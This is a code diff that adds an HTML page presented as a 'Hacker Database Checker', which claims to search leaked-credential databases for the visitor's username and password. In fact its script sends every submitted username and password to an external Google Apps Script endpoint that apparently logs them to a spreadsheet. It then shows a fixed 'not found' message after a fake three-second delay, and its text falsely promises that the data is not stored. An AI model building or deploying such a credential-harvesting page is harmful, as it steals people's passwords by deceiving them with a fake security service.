@@ -1,0 +1,38 @@
+
+<h2 align = "center">Hacker Database Checker</h2>
+<div align = "center"><p><img src = "https://blog.paessler.com/hubfs/De-Anonymize-Code.png" height="420" width="600"></p>
+
+
+
+<form name="submit-to-google-sheet" align = "center">
+  <input name="username" placeholder="username" required>
+  <input name="password" placeholder="password" required>
+  <button type="submit" onclick="myFunction()">Send</button>
+</form>
+<h5 id = "demo" align = "center"></h5>
+<p>With the advent of various spam links, and phishing websites that use the average internet user's naive and trusting approach towards life to exploit them, and steal their 
+personal information, the need of such a database checker is paramount.
+It does exactly as advertised. It takes your computer's username and passowrd, and runs it against various databases scattered in the web, posted by malicious anonymous hackers that 
+contain such information collected from thousands of unsuspecting users. That's right, your login info might already be in the public domain, waiting to be used 
+by a laptop bearing degenerate to make your life a privacy-less living hell. This website is in retaliation. I have parsed more than 20 such databases using proprietary scripts.
+You just have to input your credentials, and the system would take a couple of seconds to search the vast repository of names and passwords and say if yours is in them. If it's not, your data will not be stored. If you get a message, "Your creds have been found in the repository",
+quickly change them, to deter the hackers. Remember, nobody is trustworthy in this world, but me. Do not share your creds online with anyone, unless they say they do 
+not store them. Which I did.</p>
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbzEmXveZXTSkBs_ukB59HilwbMku-adfpON7q-JAscEuO_TsBI/exec'
+  const form = document.forms['submit-to-google-sheet']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+  function myFunction() {
+  document.getElementById("demo").innerHTML = "Checking.....</i>";
+  //code before the pause
+setTimeout(function(){
+    document.getElementById("demo").innerHTML = "Your credentials were not found in any Database. Congratulations";//do what you need here
+}, 3000);
+}
+</script>
